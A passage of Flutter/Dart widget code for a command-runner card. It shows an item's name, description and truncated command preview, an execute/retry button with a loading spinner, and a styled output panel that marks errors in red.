                        item.name,
                        style: AppTextStyles.body(
                          size: 13,
                          color: AppColors.textPrimary,
                        ),
                      ),
                      const SizedBox(height: 2),
                      Text(
                        item.description,
                        style: AppTextStyles.caption(
                          size: 11,
                          color: AppColors.textMuted,
                        ),
                      ),
                      const SizedBox(height: 5),
                      Container(
                        padding: const EdgeInsets.symmetric(
                          horizontal: 6,
                          vertical: 3,
                        ),
                        decoration: BoxDecoration(
                          color: AppColors.bgDark,
                          borderRadius: BorderRadius.circular(4),
                        ),
                        child: Text(
                          item.command.length > 72
                              ? '${item.command.substring(0, 72)}…'
                              : item.command,
                          style: const TextStyle(
                            fontFamily: 'Monaco',
                            fontFamilyFallback: ['Courier New', 'monospace'],
                            fontSize: 10.5,
                            color: AppColors.textSecondary,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 10),
                SizedBox(
                  width: 52,
                  height: 28,
                  child: isRunning
                      ? Center(
                          child: SizedBox(
                            width: 14,
                            height: 14,
                            child: CircularProgressIndicator(
                              strokeWidth: 1.5,
                              color: color,
                            ),
                          ),
                        )
                      : OutlinedButton(
                          onPressed: onRun,
                          style: OutlinedButton.styleFrom(
                            foregroundColor: color,
                            side: BorderSide(
                              color: color.withValues(alpha: 0.6),
                            ),
                            padding: EdgeInsets.zero,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(6),
                            ),
                          ),
                          child: Text(
                            hasResult ? S.btnRetry : S.btnExecute,
                            style: AppTextStyles.caption(
                              size: 11,
                              color: color,
                            ),
                          ),
                        ),
                ),
              ],
            ),
          ),
          if (hasResult)
            Container(
              width: double.infinity,
              decoration: BoxDecoration(
                color: isError
                    ? AppColors.red.withValues(alpha: 0.05)
                    : AppColors.bgDark.withValues(alpha: 0.8),
                borderRadius: const BorderRadius.only(
                  bottomLeft: Radius.circular(8),
                  bottomRight: Radius.circular(8),
                ),
                border: Border(
                  top: BorderSide(
                    color: isError
                        ? AppColors.red.withValues(alpha: 0.3)
                        : AppColors.border,
                  ),
                ),
              ),
              padding: const EdgeInsets.all(10),
              child: SelectableText(
                isNoOutput ? S.noOutput : result!,
                style: TextStyle(
                  fontFamily: 'Monaco',
                  fontFamilyFallback: const ['Courier New', 'monospace'],
                  fontSize: 11.5,
                  height: 1.6,
                  color: isError
                      ? AppColors.red
                      : (isNoOutput
                            ? AppColors.textMuted
                            : const Color(0xFFB8C0CC)),
                ),
              ),
            ),
        ],
      ),
    );
  }
}
